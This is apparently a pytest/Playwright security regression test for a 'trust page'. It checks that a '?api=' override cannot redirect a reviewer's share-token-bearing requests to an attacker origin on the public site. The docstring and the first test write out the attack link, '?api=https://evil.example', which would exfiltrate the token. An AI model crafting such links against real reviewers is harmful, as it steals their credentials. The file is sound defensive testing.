"""Red-team W-01: the reviewer trust page must not honour `?api=` in public.

The trust page supports a `?api=<base-url>` override, added "for local
Playwright tests only". Every request that page makes carries the reviewer's
share token in the `X-EPI-Share-Token` header, so an attacker-supplied
`?api=https://evil.example` on a link a reviewer opens would:

* forward the victim's reviewer credential to the attacker (trust-doc fetch,
  witness-lines fetch, pack download, and every event POST), and
* let the attacker serve arbitrary content back as the "trust page".

The site's Content-Security-Policy is **Report-Only** (`website/_headers`), so
nothing else would stop it.

The override is therefore honoured only on a local host. These tests pin that:
the public hostname must ignore it, and the local dev host must still honour
it (the existing test-suite depends on that).

The async Playwright API is used deliberately: the sync API cannot be used
while an asyncio loop is running, and the repo's suite has tests that leave one
running (a pre-existing issue that makes the sync-API browser tests fail in a
full-suite run).
"""

from __future__ import annotations

from pathlib import Path
from urllib.parse import urlparse

import pytest

REPO = Path(__file__).resolve().parents[1]
WEBSITE = REPO / "website"
TOKEN = "0" * 64

pytestmark = pytest.mark.browser


async def _serve_website(route) -> None:
    """Serve the real website tree, but under a chosen public hostname."""
    url = route.request.url
    path = urlparse(url).path

    target = (WEBSITE / path.lstrip("/")).resolve()
    if WEBSITE.resolve() not in target.parents and target != WEBSITE.resolve():
        await route.fulfill(status=403, body="forbidden")
        return
    if target.is_dir():
        target = target / "index.html"
    if not target.is_file():
        # Production rewrites pretty trust links to the app shell.
        if path.startswith("/t/"):
            shell = WEBSITE / "t" / "app" / "index.html"
            if shell.is_file():
                await route.fulfill(
                    status=200,
                    body=shell.read_bytes(),
                    content_type="text/html",
                )
                return
        await route.fulfill(status=404, body="not found")
        return

    content_type = "text/html"
    if target.suffix == ".js":
        content_type = "text/javascript"
    elif target.suffix == ".css":
        content_type = "text/css"
    elif target.suffix == ".json":
        content_type = "application/json"
    await route.fulfill(status=200, body=target.read_bytes(), content_type=content_type)


@pytest.mark.asyncio
async def test_api_override_is_ignored_on_a_public_hostname():
    """A reviewer opening a link with ?api= must not leak their token."""
    playwright = pytest.importorskip("playwright.async_api")
    offenders: list[str] = []

    async with playwright.async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        try:
            page = await browser.new_page()

            async def handler(route):
                url = route.request.url
                if url.startswith("https://evil.example"):
                    offenders.append(url)
                    await route.abort()
                    return
                await _serve_website(route)

            await page.route("**/*", handler)
            await page.goto(
                f"https://epilabs.org/t/sh_test?api=https://evil.example#k={TOKEN}",
                wait_until="load",
            )
            # The human gate is the only thing that triggers fetches.
            btn = page.locator("#gateBtn")
            if await btn.count():
                await btn.click()
            await page.wait_for_timeout(1500)
        finally:
            await browser.close()

    assert offenders == [], (
        "the reviewer share token was sent to an attacker-controlled origin: "
        f"{offenders}"
    )


@pytest.mark.asyncio
async def test_api_override_is_still_honoured_on_localhost():
    """The local Playwright workflow must keep working.

    Served from a `localhost` origin, the override stays enabled and the stub
    API is called — this is what the existing trust-page test-suite relies on.
    """
    playwright = pytest.importorskip("playwright.async_api")
    seen: list[str] = []

    async with playwright.async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        try:
            page = await browser.new_page()

            async def handler(route):
                url = route.request.url
                if url.startswith("https://local-api.test"):
                    seen.append(url)
                    await route.fulfill(
                        status=200,
                        body=b'{"vendor":"Acme","agents":[],"inboxes":[],"artifacts":[]}',
                        content_type="application/json",
                    )
                    return
                await _serve_website(route)

            await page.route("**/*", handler)
            await page.goto(
                f"http://localhost/t/sh_test?api=https://local-api.test#k={TOKEN}",
                wait_until="load",
            )
            btn = page.locator("#gateBtn")
            if await btn.count():
                await btn.click()
            await page.wait_for_timeout(1500)
        finally:
            await browser.close()

    assert seen, "the ?api= override must still work on localhost"
